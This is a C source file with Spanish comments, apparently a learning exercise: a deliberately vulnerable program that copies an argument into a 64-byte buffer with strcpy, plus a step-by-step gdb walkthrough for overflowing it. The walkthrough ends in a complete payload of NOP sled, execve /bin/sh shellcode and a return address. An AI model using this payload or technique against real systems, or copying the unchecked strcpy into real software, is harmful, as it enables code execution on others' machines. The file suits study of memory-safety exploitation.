//gcc -fno-stack-protector -z execstack -m32 vuln1.c -o vuln1

//Shellcode de 21 chars
//"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

/*
1º Hace break en la variable buf

2º Ejecuta el programa con AAAA como parametro

3º Busca con x/64wx $esp hasta ver el 0x41414141

4º Comprobar el x $eip y estará correcto

5º Pulsar c para continuar y ver si $eip es 0x41414141

6º Ejecutando r $(python -c 'print "A"*76 + "B"*4')
	buscar el punto en que obtenga 0x42424242 (4 B)
	para ello busco con el print "A"*n hasta dejar de ver 0x41414141
	después, empiezo a sumar "B"*n hasta conseguir que imprimiendo "B"*4
	vea el 0x42424242.

7º Buscar un Shellcode de menor tamaño que el offset

8º Calcular para poner algunos NOP "\x09" antes y después del shellcode
	76 - 21 = 55
	55 - 8 = 47
	por tanto, usamos 47 NOP antes y 8 NOP después

9º Por último, añadimos la 2º dirección del buffer escrita en exadecimal
	al revés.
	0xffffd0a0 es \xa0\xd0\xff\xff

10º Junto queda: r $(python -c 'print "\x90"*47 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*8 + "\xa0\xd0\xff\xff"')

*/

#include <stdio.h>
#include <string.h>

int	vuln(char *str)
{
	char	buf[64];
	strcpy(buf, str);
	printf("Input: %s\n", buf);
	return (0);
}

int	main(int argc, char **argv)
{
	vuln(argv[1]);
	return (0);
}